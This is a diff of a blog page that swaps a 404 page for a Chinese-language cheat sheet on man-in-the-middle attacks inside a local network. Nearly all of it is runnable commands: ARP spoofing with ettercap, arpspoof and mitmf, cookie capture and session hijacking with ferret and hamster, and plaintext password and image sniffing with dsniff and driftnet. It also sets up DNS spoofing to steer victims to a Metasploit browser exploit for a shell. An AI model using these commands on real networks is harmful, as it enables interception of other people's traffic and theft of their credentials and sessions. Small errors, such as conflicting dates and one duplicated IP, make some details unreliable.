@@ -5,7 +5,7 @@
     <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>404</title>
+<title>内网中间人玩法备忘录</title>
 <meta name="description" content="A blog about programming and network security">
 
 <link rel="profile" href="https://gmpg.org/xfn/11" />
@@ -101,51 +101,193 @@
 
     <div class="page-content">
       <div class="wrap">
-      <div class="container-fluid index error">
+      
+
+<div class="container-fluid single">
   <div class="row">
 
-    <div class="col-md-12 content-panel articles">
-      <h1 class="header author-header">404</h1>
+    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
+      
 
-      <div class="error-text">
-        Sorry but this page doesn't seem to exist.
+      <h1 class="header" itemprop="name">内网中间人玩法备忘录</h1>
+
+      <div class="author">
+        <small><i>
+          
+          on <span itemprop="datePublished" content="2014-08-28">May 16, 2017</span>
+           under web
+        </i></small>
       </div>
 
-      <div class="error-text">
-        <a href="/">Home</a> |
-        <a href="/posts/">All Posts</a> |
-        <a href="/search/">Search</a>
+      <div class="read-time">
+        <small>
+          1 minute read
+        </small>
       </div>
 
-      <p class="links">
-  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
-  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
-  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
-</p>
+      <div class="content-panel content">
 
+        
+
+        <span itemprop="articleBody"><h3 id="0x00-about">0x00 About</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>记录内网中间人的玩法
+</code></pre>
+</div>
+
+<h3 id="0x01-欺骗方法">0x01 欺骗方法</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>a)ettercap
+    ettercap -Tqi eth0 -M arp /ip// /ip//
+b)arpspoof
+    echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+    arpspoof -i eth0 -t 192.168.1.101 192.168.1.1
+        让受害者以为自己是网关
+    arpspoof -i eth0 -t 192.168.1.1 192.168.1.101
+        让网关以为自己是受害者
+c)mitmf
+    mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
+</code></pre>
+</div>
+
+<h3 id="0x02-利用原理">0x02 利用原理</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>利用中间人欺骗(ettercap,arpspoof,mitmf)使流量经过本机,然后通过数据分析工具(ferret,wireshark,dsniff,driftnet)提取出重要信息(cookie,passwords,pictures)
+</code></pre>
+</div>
+
+<h3 id="0x03-不同组合">0x03 不同组合</h3>
+
+<h4 id="0xa-ettercapferrethamster">0xa ettercap+ferret+hamster</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>作用:监听cookie达到会话劫持的目的
+
+1.ettercap:让数据经过本机网卡
+ettercap -Tqi eth0 -M arp /192.168.1.1// ///
+    欺骗路由器192.168.1.1和其他机器的通话
+    ettercap -Tqi eth0 -M arp /// ///
+        欺骗任意两台机器之间的通话
+    ettercap -Tqi eth0 -M arp /192.168.1.101// /192.168.1.1//
+        欺骗192.168.1.101和路由器192.168.1.101之间的通话
+
+2.ferret:取cookie
+ferret -i eth0
+    kali(x64)没有ferret,需要如下命令安装:
+    dpkg --add-architecture i386 &amp;&amp; apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y &amp;&amp; aptitude install ferret-sidejack:i386
+
+3.hamster:利用cookie
+hamster
+    需要设置浏览器的代理为127.0.0.1:1234,并在浏览器中访问http://hamster
+</code></pre>
+</div>
+
+<h4 id="0xb-cain">0xb cain</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取密码
+</code></pre>
+</div>
+
+<h4 id="0xc-mitmfdsniff">0xc mitmf+dsniff</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取明文密码
+
+mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
+dsniff -i eth0
+    或dsniff -p file.pcap(这里需要中间人欺骗后wireshark抓包)
+</code></pre>
+</div>
+
+<h4 id="0xd-ettercapdriftnet">0xd ettercap+driftnet</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取图片
+
+ettercap -Tqi eth0 -M arp /192.168.1.1// ///
+driftnet -i eth0 -a -d /tmp/output/
+    或driftnet -f file.pcap -a -d /tmp/output/(这里需要中间人欺骗后wireshark抓包)
+</code></pre>
+</div>
+
+<h4 id="0xe-ettercapiefirefoxchromesafari漏洞">0xe ettercap+ie(firefox,chrome,safari)漏洞</h4>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>作用:获取shell
+
+vim /etc/ettercap/etter.conf
+    编辑将euid和egid设置为0,并设置使用iptables或是ipchains,设置完成后再运行下面的命令,或者参考如下
+        https://www.youtube.com/watch?v=tW_NMG2IZ5s
+
+vim /etc/ettercap/etter.dns
+    添加* A 192.168.1.101在开始设置解析的地方
+
+ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
+    ettercap -P list可查看支持的插件
+    这里用的是dns欺骗插件
+
+msf设置利用ie漏洞或其他浏览器的漏洞
+    
+</code></pre>
+</div>
+</span>
+
+        
+
+
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            中间人, 内网
+          </small>
+        </div>
+        
+
+      </div>
+
+      
+      <div class="content-panel feedback">
+        I <i class="fa fa-heart"></i> feedback.<br />
+        Let me know what you think of this article on twitter <a href="https://www.twitter.com/quanyechavshuo">@quanyechavshuo</a>!
+      </div>
+      
+
+
+      
+
+
+
+      
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="/web/2017/05/16/内网中间人玩法备忘录" data-title="" data-url="https://3xp10it.github.io//web/2017/05/16/%E5%86%85%E7%BD%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E7%8E%A9%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"3xp10it"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+<!-- 多说公共JS代码 end -->
+
+<!-- 个人增加织网背景效果 -->
+<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+      
+
+
+      
 
     </div>
 
   </div>
 
-  <div class="content-panel related">
-    
-      <div class="related-header">
-        <a href="/web/2017/05/20/HHKB-BT%E9%94%AE%E7%9B%98%E8%AE%BE%E7%BD%AE/">Suggested Article</a>
-      </div>
-      <div class="title">
-        <a href="/web/2017/05/20/HHKB-BT%E9%94%AE%E7%9B%98%E8%AE%BE%E7%BD%AE/">HHKB BT键盘设置</a>
-      </div>
-      <div class="excerpt">
-         
-          HHKB BT键盘设置
-         
-        <a href="/web/2017/05/20/HHKB-BT%E9%94%AE%E7%9B%98%E8%AE%BE%E7%BD%AE/">Continue Reading</a>
-      </div>
-    
-  </div>
-
 </div>
+
+
+
+
 
       </div>
     </div>
